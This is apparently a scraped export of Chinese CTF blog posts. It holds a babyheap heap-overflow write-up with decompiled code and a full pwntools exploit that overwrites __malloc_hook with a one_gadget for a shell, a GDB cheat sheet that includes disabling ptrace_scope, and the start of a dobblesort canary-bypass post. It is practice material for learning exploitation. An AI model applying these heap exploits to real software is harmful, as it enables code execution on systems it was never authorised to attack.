a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// [rsp+1Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index: &quot;</span>);</span><br><span class=\"line\">  result = sub_138C();</span><br><span class=\"line\">  v2 = result;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">int</span>)result &gt;= <span class=\"number\">0</span> &amp;&amp; (<span class=\"type\">int</span>)result &lt;= <span class=\"number\">15</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    result = *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">24LL</span> * (<span class=\"type\">int</span>)result + a1);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (_DWORD)result == <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Size: &quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//重新读取了一个size</span></span><br><span class=\"line\">      result = sub_138C();</span><br><span class=\"line\">      v3 = result;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (<span class=\"type\">int</span>)result &gt; <span class=\"number\">0</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content: &quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> sub_11B2(*(_QWORD *)(<span class=\"number\">24LL</span> * v2 + a1 + <span class=\"number\">16</span>), v3);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在fill的实现函数中，填充的字符size是重新输入的，所以这个地方可以进行溢出</p>\n<h3 id=\"0x3-Process\">0x3 Process</h3>\n<ol>\n<li>泄漏libc_base</li>\n<li>劫持__malloc_hooc(利用偏移)</li>\n<li>getshell</li>\n</ol>\n<h3 id=\"0x4-Some-Questions\">0x4 Some Questions</h3>\n<ul>\n<li>利用偏移制造fake_chunk时,算错</li>\n<li>泄漏的地址和__malloc_hook相对于libc_base的偏移都可以通过本地调试获取</li>\n</ul>\n<h3 id=\"0x4-exp\">0x4 exp</h3>\n<p>这个题是参考《CTF竞赛权威指南》进行的一个复现:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./babyheap&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">alloc</span>(<span class=\"params\">size</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Command: &#x27;</span>,<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Size: &#x27;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">fill</span>(<span class=\"params\">idx,payload</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Command: &#x27;</span>,<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Index: &#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Size: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(payload)))</span><br><span class=\"line\">    p.sendafter(<span class=\"string\">&#x27;Content: &#x27;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Command: &#x27;</span>,<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Index: &#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dump</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Command: &#x27;</span>,<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Index: &#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Content: \\n&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p.recvline()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">fastbin_dup</span>():</span><br><span class=\"line\">    alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    alloc(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">    free(<span class=\"number\">1</span>)</span><br><span class=\"line\">    free(<span class=\"number\">2</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\">    payload = cyclic(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    payload+= p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x21</span>)</span><br><span class=\"line\">    payload+= p64(<span class=\"number\">0</span>) + cyclic(<span class=\"number\">0x8</span>)</span><br><span class=\"line\">    payload+= p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x21</span>)</span><br><span class=\"line\">    payload+= p8(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">    fill(<span class=\"number\">0</span>,payload)</span><br><span class=\"line\">    //将<span class=\"number\">2</span>号chunk的fd指针改成最后一个大小<span class=\"number\">0x80</span>的<span class=\"number\">4</span>号chunk</span><br><span class=\"line\">    //利用第一个chunk偏移为<span class=\"number\">0</span>的特点在没有泄漏时实现(在实现了tcache机制的libc版本有所不同，系统会先分配一段空间给tcache使用)</span><br><span class=\"line\">    payload = cyclic(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    payload+= p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x21</span>)</span><br><span class=\"line\">    fill(<span class=\"number\">3</span>,payload)</span><br><span class=\"line\">    //更改<span class=\"number\">4</span>号chunk的size区，使得其能绕过检查</span><br><span class=\"line\">    alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    //在原<span class=\"number\">4</span>号chunk位置再分配</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leak_libc</span>():</span><br><span class=\"line\">    <span class=\"keyword\">global</span> libc_base,malloc_hook</span><br><span class=\"line\"></span><br><span class=\"line\">    payload = cyclic(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    payload+= p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x91</span>)</span><br><span class=\"line\">    fill(<span class=\"number\">3</span>,payload)</span><br><span class=\"line\">    //<span class=\"number\">4</span>号chunksize改回来</span><br><span class=\"line\">    alloc(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">    free(<span class=\"number\">4</span>)</span><br><span class=\"line\">    leak_addr = u64(dump(<span class=\"number\">2</span>)[:<span class=\"number\">8</span>])</span><br><span class=\"line\">    //释放后来到unsort_bin,fd和bk指向libc地址</span><br><span class=\"line\">    libc_base = leak_addr - <span class=\"number\">0x3c3b78</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">    malloc_hook = libc_base + <span class=\"number\">0x3c3b10</span></span><br><span class=\"line\"></span><br><span class=\"line\">    log.info(<span class=\"string\">&#x27;leak add: 0x%x&#x27;</span> % leak_addr)</span><br><span class=\"line\">    log.info(<span class=\"string\">&#x27;libc base: 0x%x&#x27;</span> % libc_base)</span><br><span class=\"line\">    log.info(<span class=\"string\">&#x27;__malloc_hook add: 0x%x&#x27;</span> % malloc_hook)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwn</span>():</span><br><span class=\"line\">    alloc(<span class=\"number\">0x60</span>)</span><br><span class=\"line\">    free(<span class=\"number\">4</span>)</span><br><span class=\"line\">    fill(<span class=\"number\">2</span>,p64(malloc_hook - <span class=\"number\">0x28</span> + <span class=\"number\">0x5</span>))</span><br><span class=\"line\">    //利用偏移伪造fake_chunk</span><br><span class=\"line\">    alloc(<span class=\"number\">0x60</span>)</span><br><span class=\"line\">    alloc(<span class=\"number\">0x60</span>)</span><br><span class=\"line\">    //分配到fake_chunk(malloc_hook 附近)</span><br><span class=\"line\">    one_gadget = libc_base + <span class=\"number\">0x4525a</span></span><br><span class=\"line\">    fill(<span class=\"number\">6</span>,p8(<span class=\"number\">0</span>)*<span class=\"number\">0x13</span> + p64(one_gadget))</span><br><span class=\"line\">    //将one_gadget写入hook</span><br><span class=\"line\">    alloc(<span class=\"number\">1</span>)</span><br><span class=\"line\">    p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    fastbin_dup()</span><br><span class=\"line\">    leak_libc()</span><br><span class=\"line\">    pwn()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"0x6-New-Skills\">0x6 New Skills</h3>\n<ul>\n<li>\n<p>利用偏移制造fake_chunk:<br>\n一般libc地址最高位为7f，符合fast_bin对size的检查<br>\n所以可以通过偏移，将此字节移动到size位实现</p>\n</li>\n<li>\n<p>利用unsort_bin泄漏libc地址<br>\n当unsort_bin只有一个chunk时，其fd和bk都指向libc的地址，所以可以通过此，泄漏libc地址<br>\n一般需要能够在释放后仍然能够控制或读取此chunk</p>\n</li>\n<li>\n<p>直接通过堆溢出制造实现UAF<br>\n核心：在没有tcache机制的的libc下，chunk固定从一个内存页面的开始部分进行分配，所以，对于分配的chunk的地址最后一个字节，是可以推算出来的</p>\n</li>\n</ul>\n"},{"title":"Diversified-use-of-GDB","date":"2022-04-19T16:00:00.000Z","toc":true,"sidebar":"none","_content":"\n\n\n\n\n| 命令名称    | 命令缩写  | 命令说明                                         |\n| ------------- | ----------- | -------------------------------------------------- |\n| run         | r         | 运行一个待调试的程序                             |\n| continue    | c         | 让暂停的程序继续运行                             |\n| next        | n         | 运行到下一行                                     |\n| step        | s         | 单步执行，遇到函数会进入                         |\n| until       | u         | 运行到指定行停下来                               |\n| finish      | fi        | 结束当前调用函数，回到上一层调用函数处           |\n| return      | return    | 结束当前调用函数并返回指定值，到上一层函数调用处 |\n| jump        | j         | 将当前程序执行流跳转到指定行或地址               |\n| print       | p         | 打印变量或寄存器值                               |\n| backtrace   | bt        | 查看当前线程的调用堆栈                           |\n| frame       | f         | 切换到当前调用线程的指定堆栈                     |\n| thread      | thread    | 切换到指定线程                                   |\n| break       | b         | 添加断点                                         |\n| tbreak      | tb        | 添加临时断点                                     |\n| delete      | d         | 删除断点                                         |\n| enable      | enable    | 启用某个断点                                     |\n| disable     | disable   | 禁用某个断点                                     |\n| watch       | watch     | 监视某一个变量或内存地址的值是否发生变化         |\n| list        | l         | 显示源码                                         |\n| info        | i         | 查看断点 / 线程等信息                            |\n| ptype       | ptype     | 查看变量类型                                     |\n| disassemble | dis       | 查看汇编代码                                     |\n| set args    | set args  | 设置程序启动命令行参数                           |\n| show args   | show args | 查看设置的命令行参数                             |\n\n## 调试无符号程序\n1. run\n   先将程序运行\n2. b \\* \\_\\_libc\\_start\\_main\n   因为没有main函数的符号，所以只能在libc库中的start函数下断点\n3. 可以愉快的调试了\n\n## 调试带参数的程序\nset args \\[arg1\\] \\[arg2\\] ···\n\n通过此命令设置命令行参数\n\n## 分屏调试\n- 安装tmux\n- 使用[[tmux]]分屏\n- [[ps]]获取进程pid\n- gdb启动\n- attach 进程\n#### 错误解决\n- Operation not permitted\n  ubuntu特性：\n  系统为安全考虑，默认阻止一个进程检查和修改另一个进程，除非前者是后者的父进程。\n  阻止操作由 **ptrace_scope** 实现，当 **ptrace_scope** = 1 时，gdb 在调试运行中的进程时，会产生如上报错\n\n- 解决： \n  查看 ptrace_scope ：cat /proc/sys/kernel/yama/ptrace_scope\n  修改 ptrace_scope ：vi /etc/sysctl.d/10-ptrace.conf（修改为 kernel.yama.ptrace_scope = 0）\n  生效 ：sysctl -p /etc/sysctl.d/10-ptrace.conf （不行就重启）\n  重启 ：reboot\n\n\n## gdb attach 其他架构进程\n- pwntools 将程序开在本地架构其他端口上\n\t  sh = process([\"qemu-aarch64\", \"-g\", \"1234\", \"./arm\"])\n- 脚本中pause()等待attch\n- gdb-multiarch  打开调试程序\n- target  remote localhost : 1234\n\t  attach到对应端口的程序上\n\n## gdb 调试与程序输出的分离\n- 先在一个终端窗口使用tty命令，得到其文件描述符\n- 再在另一个窗口使用gdb 启动要调试的程序\n- gdb中用tty \"文件描述符\" 将输出重定向\n- run","source":"_posts/Diversified-use-of-GDB.md","raw":"---\ntitle: Diversified-use-of-GDB\ndate: 2022-4-20\ntags: \n- Pwn\n- CTF\n\ncategories:\n- CTF\n\ntoc: true # 是否启用内容索引\nsidebar: none # 是否启用sidebar侧边栏，none：不启用\n---\n\n\n\n\n\n| 命令名称    | 命令缩写  | 命令说明                                         |\n| ------------- | ----------- | -------------------------------------------------- |\n| run         | r         | 运行一个待调试的程序                             |\n| continue    | c         | 让暂停的程序继续运行                             |\n| next        | n         | 运行到下一行                                     |\n| step        | s         | 单步执行，遇到函数会进入                         |\n| until       | u         | 运行到指定行停下来                               |\n| finish      | fi        | 结束当前调用函数，回到上一层调用函数处           |\n| return      | return    | 结束当前调用函数并返回指定值，到上一层函数调用处 |\n| jump        | j         | 将当前程序执行流跳转到指定行或地址               |\n| print       | p         | 打印变量或寄存器值                               |\n| backtrace   | bt        | 查看当前线程的调用堆栈                           |\n| frame       | f         | 切换到当前调用线程的指定堆栈                     |\n| thread      | thread    | 切换到指定线程                                   |\n| break       | b         | 添加断点                                         |\n| tbreak      | tb        | 添加临时断点                                     |\n| delete      | d         | 删除断点                                         |\n| enable      | enable    | 启用某个断点                                     |\n| disable     | disable   | 禁用某个断点                                     |\n| watch       | watch     | 监视某一个变量或内存地址的值是否发生变化         |\n| list        | l         | 显示源码                                         |\n| info        | i         | 查看断点 / 线程等信息                            |\n| ptype       | ptype     | 查看变量类型                                     |\n| disassemble | dis       | 查看汇编代码                                     |\n| set args    | set args  | 设置程序启动命令行参数                           |\n| show args   | show args | 查看设置的命令行参数                             |\n\n## 调试无符号程序\n1. run\n   先将程序运行\n2. b \\* \\_\\_libc\\_start\\_main\n   因为没有main函数的符号，所以只能在libc库中的start函数下断点\n3. 可以愉快的调试了\n\n## 调试带参数的程序\nset args \\[arg1\\] \\[arg2\\] ···\n\n通过此命令设置命令行参数\n\n## 分屏调试\n- 安装tmux\n- 使用[[tmux]]分屏\n- [[ps]]获取进程pid\n- gdb启动\n- attach 进程\n#### 错误解决\n- Operation not permitted\n  ubuntu特性：\n  系统为安全考虑，默认阻止一个进程检查和修改另一个进程，除非前者是后者的父进程。\n  阻止操作由 **ptrace_scope** 实现，当 **ptrace_scope** = 1 时，gdb 在调试运行中的进程时，会产生如上报错\n\n- 解决： \n  查看 ptrace_scope ：cat /proc/sys/kernel/yama/ptrace_scope\n  修改 ptrace_scope ：vi /etc/sysctl.d/10-ptrace.conf（修改为 kernel.yama.ptrace_scope = 0）\n  生效 ：sysctl -p /etc/sysctl.d/10-ptrace.conf （不行就重启）\n  重启 ：reboot\n\n\n## gdb attach 其他架构进程\n- pwntools 将程序开在本地架构其他端口上\n\t  sh = process([\"qemu-aarch64\", \"-g\", \"1234\", \"./arm\"])\n- 脚本中pause()等待attch\n- gdb-multiarch  打开调试程序\n- target  remote localhost : 1234\n\t  attach到对应端口的程序上\n\n## gdb 调试与程序输出的分离\n- 先在一个终端窗口使用tty命令，得到其文件描述符\n- 再在另一个窗口使用gdb 启动要调试的程序\n- gdb中用tty \"文件描述符\" 将输出重定向\n- run","slug":"Diversified-use-of-GDB","published":1,"updated":"2022-07-12T12:03:30.319Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl6g6maj70003j8v00j19d090","content":"<table>\n<thead>\n<tr>\n<th>命令名称</th>\n<th>命令缩写</th>\n<th>命令说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>run</td>\n<td>r</td>\n<td>运行一个待调试的程序</td>\n</tr>\n<tr>\n<td>continue</td>\n<td>c</td>\n<td>让暂停的程序继续运行</td>\n</tr>\n<tr>\n<td>next</td>\n<td>n</td>\n<td>运行到下一行</td>\n</tr>\n<tr>\n<td>step</td>\n<td>s</td>\n<td>单步执行，遇到函数会进入</td>\n</tr>\n<tr>\n<td>until</td>\n<td>u</td>\n<td>运行到指定行停下来</td>\n</tr>\n<tr>\n<td>finish</td>\n<td>fi</td>\n<td>结束当前调用函数，回到上一层调用函数处</td>\n</tr>\n<tr>\n<td>return</td>\n<td>return</td>\n<td>结束当前调用函数并返回指定值，到上一层函数调用处</td>\n</tr>\n<tr>\n<td>jump</td>\n<td>j</td>\n<td>将当前程序执行流跳转到指定行或地址</td>\n</tr>\n<tr>\n<td>print</td>\n<td>p</td>\n<td>打印变量或寄存器值</td>\n</tr>\n<tr>\n<td>backtrace</td>\n<td>bt</td>\n<td>查看当前线程的调用堆栈</td>\n</tr>\n<tr>\n<td>frame</td>\n<td>f</td>\n<td>切换到当前调用线程的指定堆栈</td>\n</tr>\n<tr>\n<td>thread</td>\n<td>thread</td>\n<td>切换到指定线程</td>\n</tr>\n<tr>\n<td>break</td>\n<td>b</td>\n<td>添加断点</td>\n</tr>\n<tr>\n<td>tbreak</td>\n<td>tb</td>\n<td>添加临时断点</td>\n</tr>\n<tr>\n<td>delete</td>\n<td>d</td>\n<td>删除断点</td>\n</tr>\n<tr>\n<td>enable</td>\n<td>enable</td>\n<td>启用某个断点</td>\n</tr>\n<tr>\n<td>disable</td>\n<td>disable</td>\n<td>禁用某个断点</td>\n</tr>\n<tr>\n<td>watch</td>\n<td>watch</td>\n<td>监视某一个变量或内存地址的值是否发生变化</td>\n</tr>\n<tr>\n<td>list</td>\n<td>l</td>\n<td>显示源码</td>\n</tr>\n<tr>\n<td>info</td>\n<td>i</td>\n<td>查看断点 / 线程等信息</td>\n</tr>\n<tr>\n<td>ptype</td>\n<td>ptype</td>\n<td>查看变量类型</td>\n</tr>\n<tr>\n<td>disassemble</td>\n<td>dis</td>\n<td>查看汇编代码</td>\n</tr>\n<tr>\n<td>set args</td>\n<td>set args</td>\n<td>设置程序启动命令行参数</td>\n</tr>\n<tr>\n<td>show args</td>\n<td>show args</td>\n<td>查看设置的命令行参数</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"调试无符号程序\">调试无符号程序</h2>\n<ol>\n<li>run<br>\n先将程序运行</li>\n<li>b * __libc_start_main<br>\n因为没有main函数的符号，所以只能在libc库中的start函数下断点</li>\n<li>可以愉快的调试了</li>\n</ol>\n<h2 id=\"调试带参数的程序\">调试带参数的程序</h2>\n<p>set args [arg1] [arg2] ···</p>\n<p>通过此命令设置命令行参数</p>\n<h2 id=\"分屏调试\">分屏调试</h2>\n<ul>\n<li>安装tmux</li>\n<li>使用[[tmux]]分屏</li>\n<li>[[ps]]获取进程pid</li>\n<li>gdb启动</li>\n<li>attach 进程</li>\n</ul>\n<h4 id=\"错误解决\">错误解决</h4>\n<ul>\n<li>\n<p>Operation not permitted<br>\nubuntu特性：<br>\n系统为安全考虑，默认阻止一个进程检查和修改另一个进程，除非前者是后者的父进程。<br>\n阻止操作由 <strong>ptrace_scope</strong> 实现，当 <strong>ptrace_scope</strong> = 1 时，gdb 在调试运行中的进程时，会产生如上报错</p>\n</li>\n<li>\n<p>解决：<br>\n查看 ptrace_scope ：cat /proc/sys/kernel/yama/ptrace_scope<br>\n修改 ptrace_scope ：vi /etc/sysctl.d/10-ptrace.conf（修改为 kernel.yama.ptrace_scope = 0）<br>\n生效 ：sysctl -p /etc/sysctl.d/10-ptrace.conf （不行就重启）<br>\n重启 ：reboot</p>\n</li>\n</ul>\n<h2 id=\"gdb-attach-其他架构进程\">gdb attach 其他架构进程</h2>\n<ul>\n<li>pwntools 将程序开在本地架构其他端口上<br>\nsh = process([“qemu-aarch64”, “-g”, “1234”, “./arm”])</li>\n<li>脚本中pause()等待attch</li>\n<li>gdb-multiarch  打开调试程序</li>\n<li>target  remote localhost : 1234<br>\nattach到对应端口的程序上</li>\n</ul>\n<h2 id=\"gdb-调试与程序输出的分离\">gdb 调试与程序输出的分离</h2>\n<ul>\n<li>先在一个终端窗口使用tty命令，得到其文件描述符</li>\n<li>再在另一个窗口使用gdb 启动要调试的程序</li>\n<li>gdb中用tty “文件描述符” 将输出重定向</li>\n<li>run</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<table>\n<thead>\n<tr>\n<th>命令名称</th>\n<th>命令缩写</th>\n<th>命令说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>run</td>\n<td>r</td>\n<td>运行一个待调试的程序</td>\n</tr>\n<tr>\n<td>continue</td>\n<td>c</td>\n<td>让暂停的程序继续运行</td>\n</tr>\n<tr>\n<td>next</td>\n<td>n</td>\n<td>运行到下一行</td>\n</tr>\n<tr>\n<td>step</td>\n<td>s</td>\n<td>单步执行，遇到函数会进入</td>\n</tr>\n<tr>\n<td>until</td>\n<td>u</td>\n<td>运行到指定行停下来</td>\n</tr>\n<tr>\n<td>finish</td>\n<td>fi</td>\n<td>结束当前调用函数，回到上一层调用函数处</td>\n</tr>\n<tr>\n<td>return</td>\n<td>return</td>\n<td>结束当前调用函数并返回指定值，到上一层函数调用处</td>\n</tr>\n<tr>\n<td>jump</td>\n<td>j</td>\n<td>将当前程序执行流跳转到指定行或地址</td>\n</tr>\n<tr>\n<td>print</td>\n<td>p</td>\n<td>打印变量或寄存器值</td>\n</tr>\n<tr>\n<td>backtrace</td>\n<td>bt</td>\n<td>查看当前线程的调用堆栈</td>\n</tr>\n<tr>\n<td>frame</td>\n<td>f</td>\n<td>切换到当前调用线程的指定堆栈</td>\n</tr>\n<tr>\n<td>thread</td>\n<td>thread</td>\n<td>切换到指定线程</td>\n</tr>\n<tr>\n<td>break</td>\n<td>b</td>\n<td>添加断点</td>\n</tr>\n<tr>\n<td>tbreak</td>\n<td>tb</td>\n<td>添加临时断点</td>\n</tr>\n<tr>\n<td>delete</td>\n<td>d</td>\n<td>删除断点</td>\n</tr>\n<tr>\n<td>enable</td>\n<td>enable</td>\n<td>启用某个断点</td>\n</tr>\n<tr>\n<td>disable</td>\n<td>disable</td>\n<td>禁用某个断点</td>\n</tr>\n<tr>\n<td>watch</td>\n<td>watch</td>\n<td>监视某一个变量或内存地址的值是否发生变化</td>\n</tr>\n<tr>\n<td>list</td>\n<td>l</td>\n<td>显示源码</td>\n</tr>\n<tr>\n<td>info</td>\n<td>i</td>\n<td>查看断点 / 线程等信息</td>\n</tr>\n<tr>\n<td>ptype</td>\n<td>ptype</td>\n<td>查看变量类型</td>\n</tr>\n<tr>\n<td>disassemble</td>\n<td>dis</td>\n<td>查看汇编代码</td>\n</tr>\n<tr>\n<td>set args</td>\n<td>set args</td>\n<td>设置程序启动命令行参数</td>\n</tr>\n<tr>\n<td>show args</td>\n<td>show args</td>\n<td>查看设置的命令行参数</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"调试无符号程序\">调试无符号程序</h2>\n<ol>\n<li>run<br>\n先将程序运行</li>\n<li>b * __libc_start_main<br>\n因为没有main函数的符号，所以只能在libc库中的start函数下断点</li>\n<li>可以愉快的调试了</li>\n</ol>\n<h2 id=\"调试带参数的程序\">调试带参数的程序</h2>\n<p>set args [arg1] [arg2] ···</p>\n<p>通过此命令设置命令行参数</p>\n<h2 id=\"分屏调试\">分屏调试</h2>\n<ul>\n<li>安装tmux</li>\n<li>使用[[tmux]]分屏</li>\n<li>[[ps]]获取进程pid</li>\n<li>gdb启动</li>\n<li>attach 进程</li>\n</ul>\n<h4 id=\"错误解决\">错误解决</h4>\n<ul>\n<li>\n<p>Operation not permitted<br>\nubuntu特性：<br>\n系统为安全考虑，默认阻止一个进程检查和修改另一个进程，除非前者是后者的父进程。<br>\n阻止操作由 <strong>ptrace_scope</strong> 实现，当 <strong>ptrace_scope</strong> = 1 时，gdb 在调试运行中的进程时，会产生如上报错</p>\n</li>\n<li>\n<p>解决：<br>\n查看 ptrace_scope ：cat /proc/sys/kernel/yama/ptrace_scope<br>\n修改 ptrace_scope ：vi /etc/sysctl.d/10-ptrace.conf（修改为 kernel.yama.ptrace_scope = 0）<br>\n生效 ：sysctl -p /etc/sysctl.d/10-ptrace.conf （不行就重启）<br>\n重启 ：reboot</p>\n</li>\n</ul>\n<h2 id=\"gdb-attach-其他架构进程\">gdb attach 其他架构进程</h2>\n<ul>\n<li>pwntools 将程序开在本地架构其他端口上<br>\nsh = process([“qemu-aarch64”, “-g”, “1234”, “./arm”])</li>\n<li>脚本中pause()等待attch</li>\n<li>gdb-multiarch  打开调试程序</li>\n<li>target  remote localhost : 1234<br>\nattach到对应端口的程序上</li>\n</ul>\n<h2 id=\"gdb-调试与程序输出的分离\">gdb 调试与程序输出的分离</h2>\n<ul>\n<li>先在一个终端窗口使用tty命令，得到其文件描述符</li>\n<li>再在另一个窗口使用gdb 启动要调试的程序</li>\n<li>gdb中用tty “文件描述符” 将输出重定向</li>\n<li>run</li>\n</ul>\n"},{"title":"Libc-Leak-and-Bypass-the-canary-dobblesort-[pwnable]","date":"2022-04-24T16:00:00.000Z","toc":true,"sidebar":"none","_content":"\n\n\n\n\n# Libc leak and Bypass the canary-pwnable[dobblesort]\n\n## 0x1 checksec\n\n![checksec](2022-4-25-dobblesort/图像 1.png)\n\nFull protection.\n\n## 0x2 Analysis\n\n查看这个程序，\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v3; // eax\n  unsigned int *v4; // edi\n  unsigned int i; // esi\n  unsigned int j; // esi\n  int result; // eax\n  unsigned int v8; // [esp+18h] [ebp-74h] BYREF\n  unsigned int v9[8]; // [esp+1Ch] [ebp-70h] BYREF\n  char buf[64]; // [esp+3Ch] [ebp-50h] BYREF\n  unsigned int v11; // [esp+7Ch] [ebp-10h]\n\n  v11 = __readgsdword(0x14u);\n  sub_8B5();\n  __printf_chk(1, \"What your name :\");\n  